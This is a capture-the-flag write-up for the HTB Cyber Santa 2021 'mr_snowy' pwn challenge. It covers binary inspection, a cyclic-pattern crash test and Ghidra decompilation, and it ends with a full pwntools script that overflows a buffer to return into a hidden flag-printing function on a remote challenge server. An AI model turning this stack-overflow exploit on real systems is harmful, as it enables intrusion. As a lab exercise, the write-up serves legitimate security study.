The files that we got in order to solve this challenge were:
```
mr_snowy          flag.txt
```
We also get a hint
> There is ❄️ snow everywhere!! Kids are playing around, everything looks amazing. But, this ☃️ snowman... it scares me.. He is always ? staring at Santa's house. Something must be wrong with him.
---
## File inspection

The `flag.txt` file is clearly made for testing since opening it will show us its content as
```
HTB{f4k3_fl4g_4_t3st1ng}
```
\
***The file that we are most interested in is `mr_snowy`***\
\
In order to start working on this challenge, we need to inspect the file and see what we are dealing with. Since it is a `pwn` challenge, we can assume the given file is an ELF.
To make sure we run
```
file mr_snowy
```
which results in:
![result for running "file mr_snowy"](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/file_ss.png)\
From this we can see that the file is `not stripped` which is great news to us, meaning we can find a `main` function that hopefully will allow us to identify an exploit.

Next we want to see if there are any clues or maybe even the flag itself in the strings of the files so we run
```
strings mr_snowy
```
which results in a bunch of random strings, mostly useless with the exception of:
![interesting strings](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/strings_ss.png)\
This is perhaps a clue that there is a function within the file that calls `flag.txt` and further more potentially prints it out for us.

Now we already have an idea of what this challenge might want us to do, which is get to the function that prints out the flag and thus complete the challenge. But that would be too easy, wouldn't it?
Before we fire up `ghidra` and see what the deal is, we have two more things left to do. Checking the security of the file and running it.

```
checksec mr_snowy
```
which results in:\
![result of "checksec mr_snowy"](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/checksec_ss.png)\
Again, wonderful news! No PIE will make our life easier.

Now let's run it
```
chmod +x mr_snowy
./mr_snowy
```
![running it](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/running_it_1.png)\
\
We have two options. Choosing `2` will display\
![choosing 2](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/running_it_choosing_2.png)\
\
Hm.. wrong answer. Let's try `1`\
![choosing 1](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/running_it_choosing_1.png)\
\
Ok! Progress. Let's choose `2`\
![choosing 1 then 2](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/running_it_choosing_1_then_2.png)\
\
Uh oh, that wasn't the right choice. Let's go back and choose `1`\
![choosing 1 then 1](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/running_it_choosing_1_then_1.png)\
That did not work either... So that means that no matter what options you will choose, you cannot get the flag. There must be another answer to this.

---
## Buffer overflow

Whenever I see ELF files, I always try to see if I can overflow the buffer. Let's try to do that.
\
We will generate a string of 1000 which should be sufficient to test overflowing
```
pwn cyclic 1000
```
with the result
```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa
abtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadm
aadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaaf
gaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagya
agzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaais
aaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
```
Now we will write that huge string instead of `1` or `2` in the first menu option

![buff overflow 1](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/buffer_overflow_1.png)\
It seems like it did not work\
\
Let's try the second menu\
![buff overflow 2](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/images/buffer_overflow_2.png)\
Bingo! `Segmentation fault` is what we wanted. It indicates that we were able to flow the buffer and now we can write a script to potentially exploit it.\
\
Before we do that, we just need to fire up `ghidra` and check the code quickly. I have my ghidra folder in `/opt/ghidra_10.0.4_PUBLIC/` so I will run
```
/opt/ghidra_10.0.4_PUBLIC/ghidraRun
```
\
We create a project quick and analyze `mr_snowy`. Indeed in the `functions` tab we can see `deactivate_camera` with the following source code:
```
void deactivate_camera(void)

{
  char acStack104 [48];
  FILE *local_38;
  char *local_30;
  undefined8 local_28;
  int local_1c;
  
  local_1c = 0x30;
  local_28 = 0x2f;
  local_30 = acStack104;
  local_38 = fopen("flag.txt","rb");
  if (local_38 == (FILE *)0x0) {
    fwrite("[-] Could not open flag.txt, please conctact an Administrator.\n",1,0x3f,stdout);
                    /* WARNING: Subroutine does not return */
    exit(-0x45);
  }
  fgets(local_30,local_1c,local_38);
  puts("\x1b[1;32m");
  fwrite("[+] Here is the secret password to deactivate the camera: ",1,0x3a,stdout);
  puts(local_30);
  fclose(local_38);
  return;
}
```
\
So this is the function that will print our flag, but inspecting the `main` we notice that it isn't called anywhere.
\

---
## The exploit
Thus the solution is this: ***we need to execute the function `deactivate_camera` by overflowing the buffer and returning to the address of the wanted function.***
\
In order to do this I wrote a [python script](https://github.com/andreea-511/CTF-writeups/blob/main/HTB_CyberSanta2021/mr_snowy/mr_snowy.py)\
\
***This code is based on [this template](https://github.com/Crypto-Cat/CTF/blob/main/pwn/official_template.py) created by [Crypto-Cat](https://github.com/Crypto-Cat)***
```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './mr_snowy'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
#io = process()
io = remote('138.68.174.27', 32009)

rop = ROP(elf)

# Build the payload
payload = flat (
    {offset: elf.functions.deactivate_camera}
)

# Send the payload
io.sendlineafter('>', '1')
io.sendlineafter('>', payload)

io.interactive()
```
\
Commenting
```
io = remote('138.68.174.27', 32009)
```
and uncommenting
```
io = process()
```
will allow us to run the script locally and see that it prints 
```
[+] Here is the secret password to deactivate the camera: HTB{f4k3_fl4g_4_t3st1ng}
```
and running it on the target prints our flag.


